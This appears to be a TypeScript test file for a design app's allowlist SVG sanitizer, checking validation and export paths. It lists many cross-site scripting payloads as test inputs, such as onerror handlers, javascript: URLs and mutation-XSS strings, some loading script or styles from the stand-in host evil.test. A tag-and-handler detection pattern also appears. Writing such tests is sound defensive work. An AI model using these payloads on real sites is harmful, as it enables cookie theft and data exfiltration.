// H1: strict allowlist SVG sanitizer + validate/export integration.
// Run: npx tsx --test lib/design/__tests__/svg-sanitize.test.ts

import { describe, it } from "node:test";
import assert from "node:assert/strict";

import { decodeEntities, sanitizeSvgFragment } from "../svg-sanitize";
import { validateDesignDocument } from "../validate";
import { exportPageToSvg } from "../export-svg";

/** No executable surface may survive: tags, handlers, js: URLs, style. */
function assertInert(out: string) {
  // Only real tags matter: escaped text ("&lt;img onerror=…") is inert.
  const tags = (out.match(/<[^>]*>/g) ?? []).join("\n");
  assert.doesNotMatch(tags, /<(script|style|foreignObject|image|img|iframe|a|animate|set|object|embed|feImage|svg:script)\b/i, out);
  assert.doesNotMatch(tags, /\son[a-z]+\s*=/i, out);
  assert.doesNotMatch(tags, /javascript:/i, out);
  assert.doesNotMatch(tags, /\sstyle\s*=/i, out);
  assert.doesNotMatch(tags, /url\((?!#)/i, out);
}

describe("sanitizeSvgFragment — known bypasses of the old regex denylist", () => {
  const payloads = [
    `<image href="x" onerror="alert(document.cookie)"/>`,
    `<path d="M0 0"/><image xlink:href=x onerror=alert(1)>`,
    `<svg><script>alert(1)</script></svg>`,
    `<scr<script>ipt>alert(1)</scr</script>ipt>`,
    `<script >alert(1)</script >`,
    `<SCRIPT SRC=//evil.test/x.js></SCRIPT>`,
    `<a href="javascript:alert(1)"><path d="M0 0"/></a>`,
    `<use href="&#106;avascript:alert(1)"/>`,
    `<use href="java\tscript:alert(1)"/>`,
    `<use xlink:href="data:image/svg+xml;base64,PHN2Zy8+"/>`,
    `<use href="https://evil.test/sprite.svg#x"/>`,
    `<path d="M0 0" onload  =  "alert(1)" fill="red"/>`,
    `<path/onload=alert(1)>`,
    `<foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject>`,
    `<animate attributeName="href" to="javascript:alert(1)"/><set attributeName="onmouseover" to="alert(1)"/>`,
    `<style>@import url(//evil.test/x.css)</style>`,
    `<rect style="background:url(javascript:alert(1))" width="1" height="1"/>`,
    `<rect fill="url(https://evil.test/track)" width="1" height="1"/>`,
    `<text>&lt;/svg&gt;&lt;img src=x onerror=alert(1)&gt;</text>`,
    `<text></svg><img src=x onerror=alert(1)></text>`,
    `<![CDATA[<script>alert(1)</script>]]><path d="M0 0"/>`,
    `<!--><script>alert(1)</script>--><path d="M0 0"/>`,
    `<filter><feImage href="https://evil.test/x"/></filter>`,
    `<svg:script>alert(1)</svg:script>`,
    `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
  ];
  for (const p of payloads) {
    it(`neutralizes ${JSON.stringify(p).slice(0, 70)}`, () => assertInert(sanitizeSvgFragment(p)));
  }

  it("escapes text so it can never become markup", () => {
    const out = sanitizeSvgFragment(`<text x="1">a < b </svg><img src=x onerror=alert(1)> & c</text>`);
    assert.ok(!out.includes("<img"), out);
    assert.match(out, /&lt;/);
    assert.match(out, /&amp; c/);
  });

  it("drops non-allowlisted elements with their subtree", () => {
    const out = sanitizeSvgFragment(`<g><foreignObject><div><path d="M9 9"/></div></foreignObject><path d="M1 1"/></g>`);
    assert.equal(out, `<g><path d="M1 1"/></g>`);
  });

  it("closes unterminated elements and ignores stray end tags", () => {
    assert.equal(sanitizeSvgFragment(`<g><path d="M0 0"/>`), `<g><path d="M0 0"/></g>`);
    assert.equal(sanitizeSvgFragment(`</g></svg><path d="M0 0"/>`), `<path d="M0 0"/>`);
  });
});

describe("sanitizeSvgFragment — legitimate icon markup survives", () => {
  it("keeps a plain icon byte-for-byte", () => {
    const body = `<path fill="currentColor" d="M12 2l3 7h7l-5.5 4.5L18 21l-6-4-6 4 1.5-7.5L2 9h7z"/>`;
    assert.equal(sanitizeSvgFragment(body), body);
  });

  it("keeps gradients, internal url(#id) paint and #fragment use refs", () => {
    const body =
      `<defs><linearGradient id="g1" x1="0" x2="1"><stop offset="0" stop-color="#f00"/></linearGradient></defs>` +
      `<rect width="10" height="10" fill="url(#g1)"/><use href="#g1"/><use xlink:href="#g1"/>`;
    assert.equal(sanitizeSvgFragment(body), body);
  });

  it("canonicalizes element/attribute case and re-quotes values", () => {
    assert.equal(
      sanitizeSvgFragment(`<LINEARGRADIENT ID='a' gradientunits=userSpaceOnUse></LINEARGRADIENT>`),
      `<linearGradient id="a" gradientUnits="userSpaceOnUse"></linearGradient>`,
    );
  });

  it("is idempotent", () => {
    const once = sanitizeSvgFragment(`<g fill="red"><text>Tom &amp; Jerry &lt;3</text><circle r="2"/></g>`);
    assert.equal(sanitizeSvgFragment(once), once);
  });

  it("decodes numeric and named entities", () => {
    assert.equal(decodeEntities("&#106;&#x61;&amp;&lt;"), "ja&<");
  });

  it("stays fast on adversarial input", () => {
    const evil = `<a x="`.repeat(20_000) + `<g ${"x=1 ".repeat(20_000)}` + "<".repeat(50_000);
    const t0 = Date.now();
    sanitizeSvgFragment(evil);
    assert.ok(Date.now() - t0 < 2000, `took ${Date.now() - t0}ms`);
  });
});

function docWithBody(body: string) {
  return {
    schemaVersion: 1,
    pages: [
      {
        id: "p1",
        name: "Page 1",
        width: 100,
        height: 100,
        background: "#ffffff",
        elements: [
          {
            id: "icon",
            type: "svg",
            x: 0,
            y: 0,
            rotation: 0,
            opacity: 1,
            visible: true,
            locked: false,
            width: 24,
            height: 24,
            fill: "#000000",
            path: "",
            body,
            viewBox: "0 0 24 24",
          },
        ],
      },
    ],
  };
}

describe("validate + export integration (H1)", () => {
  const XSS = `<path d="M0 0"/><image href="x" onerror="fetch('/api/workspace/members')"/>`;

  it("validateDesignDocument returns the body sanitized (write path)", () => {
    const raw = docWithBody(XSS);
    const v = validateDesignDocument(raw);
    assert.equal(v.ok, true);
    if (!v.ok) return;
    const el = v.doc.pages[0].elements[0] as unknown as { body: string };
    assert.equal(el.body, `<path d="M0 0"/>`);
    // the caller's object is not mutated
    assert.equal((raw.pages[0].elements[0] as { body: string }).body, XSS);
  });

  it("exportPageToSvg never inlines an unsafe body (render path)", () => {
    const r = exportPageToSvg(docWithBody(XSS), "p1");
    assert.equal(r.ok, true);
    if (!r.ok) return;
    assertInert(r.svg.replace(/<!--[\s\S]*?-->/g, ""));
    assert.match(r.svg, /<path d="M0 0"\/>/);
  });
});
